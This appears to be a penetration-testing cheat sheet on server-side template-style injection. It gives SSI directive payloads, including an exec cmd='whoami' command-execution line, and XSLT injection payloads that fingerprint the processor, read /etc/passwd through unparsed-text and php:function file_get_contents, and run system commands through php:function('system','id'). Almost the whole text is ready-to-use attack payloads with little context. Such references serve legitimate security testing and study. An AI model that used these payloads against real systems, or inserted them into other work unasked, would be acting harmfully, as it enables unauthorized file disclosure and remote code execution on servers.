# Server-Side Includes (SSI) Injection
- File extensions: .shtml, .shtm, and .stm.
- printenv:
```ssi
<!--#printenv -->
```
- config:
```ssi
<!--#config errmsg="Error!" -->
```
- echo:
```ssi
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```
- exec:
```ssi
<!--#exec cmd="whoami" -->
```
- include:
```ssi
<!--#include virtual="index.html" -->
```
# eXtensible Stylesheet Language Transformation (XSLT) Injection
## Identifying
<img width="1549" height="247" alt="image" src="https://github.com/user-attachments/assets/0e4a2ee1-d154-40e0-9b1c-ddfa6eb84f7a" />

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

## Explotation
```bash
# LFI
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
## XSLT version 2.0 and PHP
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
# RCE
<xsl:value-of select="php:function('system','id')" />
```
